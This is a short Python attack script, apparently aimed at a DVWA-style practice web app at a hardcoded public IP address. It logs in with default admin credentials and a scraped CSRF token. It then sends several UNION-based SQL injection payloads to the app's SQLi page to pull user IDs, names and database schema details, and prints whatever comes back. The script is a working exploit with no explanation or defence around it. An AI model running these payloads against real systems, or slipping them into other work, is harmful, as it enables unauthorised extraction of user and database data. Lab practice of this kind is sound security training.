
import requests
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

url_base = "http://31.97.117.123"
session = requests.Session()

# Login
login_url = f"{url_base}/login.php"
response = session.get(login_url, verify=False)
token_match = re.search(r"name='user_token'\s+value='([^']+)'", response.text)
user_token = token_match.group(1)

payload = {
    "username": "admin",
    "password": "password",
    "user_token": user_token,
    "Login": "Login"
}

response = session.post(login_url, data=payload, verify=False, allow_redirects=True)
print("[+] Logged in successfully\n")

sqli_url = f"{url_base}/vulnerabilities/sqli/"

print("[*] Trying different approaches to extract user data...\n")

# Try to get all columns using column numbers
payloads = [
    # Try with CONCAT to combine multiple columns
    "-1' UNION SELECT CONCAT(user_id,':',first_name),CONCAT(last_name) FROM users LIMIT 10",
    # Try getting full rows
    "-1' UNION SELECT *,* FROM users",
    # Try with CAST
    "-1' UNION SELECT CAST(user_id AS CHAR), first_name FROM users",
    # Try simple SELECT without WHERE
    "-1' UNION SELECT GROUP_CONCAT(user_id),GROUP_CONCAT(first_name) FROM users",
    # Try accessing different table entirely
    "-1' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema!=0x696e666f726d6174696f6e5f736368656d61 LIMIT 5",
]

for payload_str in payloads:
    print(f"[*] Trying: {payload_str[:80]}")
    response = session.get(sqli_url, params={"id": payload_str, "Submit": "Submit"}, verify=False)
    
    # Extract the pre section
    pre_match = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
    if pre_match:
        result_text = pre_match.group(1)
        if "error" not in result_text.lower() and "Unknown" not in result_text:
            print(f"    [+] SUCCESS! Result:\n{result_text[:400]}\n")
        else:
            # Show first part
            print(f"    [-] {result_text[:150]}\n")

